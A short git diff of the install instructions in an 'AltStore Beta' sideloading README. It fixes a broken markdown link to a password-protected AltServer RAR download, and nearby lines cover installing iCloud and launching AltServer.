@@ -6,7 +6,7 @@ AltStore Beta - Sideload every iPA - **[Releases](https://github.com/Thunder7yos
 - Download the latest version of iCloud directly from **[Apple](http://updates-http.cdn-apple.com/2020/windows/061-61608-20200122-4464F20E-3D7D-11EA-ADA8-880F4463EB08/iCloudSetup.exe)** (not the Microsoft Store).
 
 # Installing 
-- Download the AltServer Beta from **[Here]https://github.com/Thunder7yoshi/AltStore-Beta/releases/download/v1.3b2-1.3b2/AltServer.Beta.Build.rar)**
+- Download the AltServer Beta from **[Here](https://github.com/Thunder7yoshi/AltStore-Beta/releases/download/v1.3b2-1.3b2/AltServer.Beta.Build.rar)**
 - Extract the downloaded “**AltServer.Beta.Build.rar**” file with **[winRAR](https://www.rarlab.com/rar/winrar-x64-580.exe)**. [The password is "**Thunder7yoshi**"]
 - Launch AltServer by double-clicking on "**AltServer**" file
   (it will appear as an icon in the **Notification Area**).
